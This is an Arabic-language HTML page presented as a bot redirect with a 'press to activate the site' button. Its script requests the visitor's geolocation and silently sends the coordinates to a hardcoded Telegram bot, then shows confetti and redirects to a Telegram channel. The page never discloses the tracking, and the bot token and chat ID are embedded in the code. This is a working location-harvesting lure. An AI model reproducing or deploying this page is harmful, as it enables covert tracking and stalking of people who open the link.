<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>صفحة توجيه البوت</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://i.pinimg.com/736x/dc/9d/41/dc9d4149758055ed003a52ff47707520.jpg');
      background-size: cover;
      background-position: center;
      height: 100vh;
      font-family: 'Arial', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    #activate-btn {
      padding: 15px 30px;
      font-size: 20px;
      border: none;
      border-radius: 8px;
      background-color: #28a745;
      color: white;
      cursor: pointer;
      margin-bottom: 20px;
    }

    #countdown {
      width: 70px;
      height: 70px;
      font-size: 30px;
      font-weight: bold;
      background-color: #ffffffcc;
      border: 2px solid #ccc;
      border-radius: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      visibility: hidden;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <button id="activate-btn">اضغط لتفعيل الموقع</button>
  <div id="countdown">5</div>

  <canvas id="confetti"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script>
    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
    const CHAT_ID = "6028485445";

    const btn = document.getElementById("activate-btn");
    const countdownEl = document.getElementById("countdown");

    let seconds = 5;

    btn.addEventListener("click", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
            .catch(() => {});

          // تشغيل الشرارات
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { y: 0.6 }
          });

          // إخفاء الزر
          btn.style.display = "none";

          // عرض العداد
          countdownEl.style.visibility = "visible";
          countdownEl.innerText = seconds;

          const interval = setInterval(() => {
            seconds--;
            countdownEl.innerText = seconds;
            if (seconds === 0) {
              clearInterval(interval);
              window.location.href = "https://t.me/sswq22";
            }
          }, 1000);
        }, () => {
          alert("لم يتم السماح بالوصول إلى الموقع.");
        });
      } else {
        alert("متصفحك لا يدعم تحديد الموقع.");
      }
    });
  </script>
</body>
</html>
